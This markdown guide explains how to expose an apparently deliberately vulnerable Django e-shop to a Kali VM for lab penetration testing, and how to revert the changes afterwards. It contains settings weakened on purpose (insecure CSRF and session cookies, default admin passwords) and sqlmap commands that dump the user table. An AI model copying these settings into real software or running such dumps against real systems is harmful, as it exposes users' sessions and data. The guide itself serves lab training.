# Kali VM Testing Setup for Vulnerable E-Shop

## Overview
This document explains how to configure the vulnerable e-shop to be accessible from a Kali Linux VM for penetration testing.

## Network Configuration
- **Host OS (macOS)**: 10.211.55.2
- **Kali VM**: 10.211.55.4
- **Django Server**: Running on port 8000

## Configuration Changes Made

### 1. ALLOWED_HOSTS (.env file)
Added VM network IPs to allowed hosts:
```
ALLOWED_HOSTS=georgeg.pythonanywhere.com,127.0.0.1,localhost,192.168.68.104,10.211.55.2,10.211.55.4
```

### 2. CSRF Settings (settings.py)
Modified CSRF protection to allow cross-origin requests from Kali VM:

```python
# CSRF cookie μόνο μέσω HTTPS
# VULNERABILITY: Disabled for testing from Kali VM
CSRF_COOKIE_SECURE = False

# SameSite policy για CSRF cookie
# VULNERABILITY: Changed to None for testing from Kali VM
CSRF_COOKIE_SAMESITE = None

# Trusted origins για CSRF
CSRF_TRUSTED_ORIGINS = [
    'https://localhost:8000',
    'http://localhost:8000',
    'http://127.0.0.1:8000',
    'http://10.211.55.2:8000',
    'http://10.211.55.4:8000'
]
```

### 3. Session Cookie Settings (Already Vulnerable)
The following settings were already configured for vulnerability testing:
```python
SESSION_COOKIE_SECURE = False
SESSION_COOKIE_HTTPONLY = False
```

## Running the Server for Kali Access

### Method 1: Direct Command
```bash
# Activate virtual environment
source /path/to/venv/bin/activate

# Run server on all interfaces
python manage.py runserver 0.0.0.0:8000
```

### Method 2: Using the Script
```bash
./run_for_kali.sh
```

## Accessing from Kali VM

1. **Web Browser Access**:
   ```
   http://10.211.55.2:8000
   ```

2. **Login Credentials**:
   - Username: `admin` / Password: `admin123`
   - Username: `test` / Password: `test123`

## Testing with SQLMap from Kali

### Step 1: Get Session Cookie
1. Login via browser from Kali
2. Open Developer Tools (F12)
3. Go to Storage/Application → Cookies
4. Copy the `sessionid` value

### Step 2: Run SQLMap
```bash
# Basic SQL injection test
sqlmap -u "http://10.211.55.2:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8

# Dump user table
sqlmap -u "http://10.211.55.2:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       -T eshop_customuser \
       --dump
```

## Security Implications

### Vulnerabilities Enabled
1. **CSRF Protection Weakened**: 
   - `CSRF_COOKIE_SECURE = False` allows cookies over HTTP
   - `CSRF_COOKIE_SAMESITE = None` allows cross-site requests
   - Multiple origins trusted including VM IPs

2. **Session Cookies Insecure**:
   - `SESSION_COOKIE_SECURE = False` allows session hijacking over HTTP
   - `SESSION_COOKIE_HTTPONLY = False` allows JavaScript access to session cookie

3. **Network Exposure**:
   - Server listens on `0.0.0.0` instead of `localhost`
   - Accessible from any device on the network

### Risk Assessment
These changes make the application vulnerable to:
- Cross-Site Request Forgery (CSRF) attacks
- Session hijacking
- Man-in-the-middle attacks
- Network-based attacks from any device on the same network

## Reverting Changes (For Production)

To secure the application after testing:

1. **Update .env**:
   ```
   ALLOWED_HOSTS=yourdomain.com
   ```

2. **Update settings.py**:
   ```python
   CSRF_COOKIE_SECURE = True
   CSRF_COOKIE_SAMESITE = 'Strict'
   CSRF_TRUSTED_ORIGINS = ['https://yourdomain.com']
   SESSION_COOKIE_SECURE = True
   SESSION_COOKIE_HTTPONLY = True
   ```

3. **Run server securely**:
   ```bash
   # Only on localhost
   python manage.py runserver 127.0.0.1:8000
   ```

## Troubleshooting

### CSRF Token Error
If you still get CSRF errors:
1. Clear browser cookies
2. Restart Django server
3. Login again from Kali

### Connection Refused
If Kali can't connect:
1. Check macOS firewall settings
2. Ensure server is running on `0.0.0.0:8000`
3. Verify network connectivity: `ping 10.211.55.2` from Kali

### Session Expires
Sessions may expire quickly. If SQLMap stops working:
1. Login again to get new sessionid
2. Update SQLMap command with new session